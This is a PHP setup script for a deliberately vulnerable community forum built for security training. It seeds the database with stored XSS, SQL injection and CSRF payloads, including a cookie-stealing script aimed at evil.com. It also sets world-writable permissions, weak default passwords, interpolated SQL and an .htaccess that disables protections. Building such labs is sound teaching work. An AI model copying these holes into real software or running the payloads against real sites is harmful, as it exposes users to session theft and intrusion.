<?php
// Setup script untuk Forum Masyarakat
echo "=== Forum Masyarakat Setup ===\n";
echo "Setting up vulnerable forum system...\n\n";

// Database configuration
$host = 'localhost';
$username = 'root';
$password = '';
$dbname = 'forum_masyarakat';

try {
    // Connect to MySQL server
    $pdo = new PDO("mysql:host=$host", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    echo "1. Connected to MySQL server ✓\n";

    // Create database
    $pdo->exec("CREATE DATABASE IF NOT EXISTS $dbname");
    echo "2. Database '$dbname' created ✓\n";

    // Switch to the database
    $pdo->exec("USE $dbname");

    // Read and execute schema
    $schema = file_get_contents(__DIR__ . '/database/schema.sql');

    // Split by delimiter and execute each statement
    $statements = explode(';', $schema);

    foreach ($statements as $statement) {
        $statement = trim($statement);
        if (!empty($statement)) {
            try {
                $pdo->exec($statement);
            } catch (PDOException $e) {
                // Skip if table already exists
                if (strpos($e->getMessage(), 'already exists') === false) {
                    echo "Warning: " . $e->getMessage() . "\n";
                }
            }
        }
    }

    echo "3. Database schema imported ✓\n";

    // Create additional vulnerable data for testing
    insertVulnerableTestData($pdo);

    echo "4. Test data inserted ✓\n";

    // Set up file permissions
    setupFilePermissions();

    echo "5. File permissions configured ✓\n";

    echo "\n=== Setup Complete! ===\n";
    echo "Default login credentials:\n";
    echo "Admin: admin / password\n";
    echo "Moderator: moderator / password\n";
    echo "User: john_doe / password\n\n";
    echo "⚠️  WARNING: This system is intentionally vulnerable!\n";
    echo "Use only for security testing and education.\n";
} catch (PDOException $e) {
    die("Database Error: " . $e->getMessage() . "\n");
}

function insertVulnerableTestData($pdo)
{
    // Insert vulnerable test posts with XSS payloads
    $vulnerablePosts = [
        [
            'title' => 'Welcome to XSS Testing <script>alert("stored xss")</script>',
            'content' => '<p>This post contains <img src=x onerror=alert("XSS")> for testing.</p><script>console.log("Stored XSS works!");</script>',
            'user_id' => 1,
            'category_id' => 1
        ],
        [
            'title' => 'SQL Injection Demo \' OR 1=1 --',
            'content' => '<p>Testing SQL injection: \' UNION SELECT user(), database() --</p>',
            'user_id' => 2,
            'category_id' => 2
        ],
        [
            'title' => 'CSRF Attack Vector',
            'content' => '<img src="admin/users.php?action=delete_user&user_id=3" style="display:none">',
            'user_id' => 3,
            'category_id' => 3
        ]
    ];

    foreach ($vulnerablePosts as $post) {
        $sql = "INSERT INTO posts (title, content, user_id, category_id, created_at) VALUES ('{$post['title']}', '{$post['content']}', {$post['user_id']}, {$post['category_id']}, NOW())";
        $pdo->exec($sql);
    }

    // Insert vulnerable replies
    $vulnerableReplies = [
        [
            'content' => '<script>document.location="http://evil.com/steal.php?cookie="+document.cookie</script>',
            'post_id' => 1,
            'user_id' => 2
        ],
        [
            'content' => '<img src=x onerror="fetch(\'/admin/users.php?action=ban_user&user_id=1\')">',
            'post_id' => 2,
            'user_id' => 3
        ]
    ];

    foreach ($vulnerableReplies as $reply) {
        $sql = "INSERT INTO replies (content, post_id, user_id, created_at) VALUES ('{$reply['content']}', {$reply['post_id']}, {$reply['user_id']}, NOW())";
        $pdo->exec($sql);
    }
}

function setupFilePermissions()
{
    $dirs = ['logs', 'assets/css', 'assets/js', 'assets/img'];

    foreach ($dirs as $dir) {
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
        }
        chmod($dir, 0777); // Vulnerable permissions
    }

    // Create empty log files with vulnerable permissions
    $logFiles = [
        'logs/access.log',
        'logs/error.log',
        'logs/sql.log',
        'logs/xss.log',
        'logs/admin.log'
    ];

    foreach ($logFiles as $logFile) {
        touch($logFile);
        chmod($logFile, 0666); // World writable - vulnerable
    }

    // Create .htaccess that might be bypassed
    file_put_contents('.htaccess', '
# Weak security headers
Header set X-XSS-Protection "0"
Header set X-Content-Type-Options ""
Header unset X-Frame-Options

# Allow dangerous file uploads
<FilesMatch "\.(php|php3|phtml|php5)$">
    Order allow,deny
    Allow from all
</FilesMatch>

# Expose sensitive files
<Files "config.php">
    Order allow,deny
    Allow from all
</Files>
    ');
}
?>

Setup completed. Starting web server test...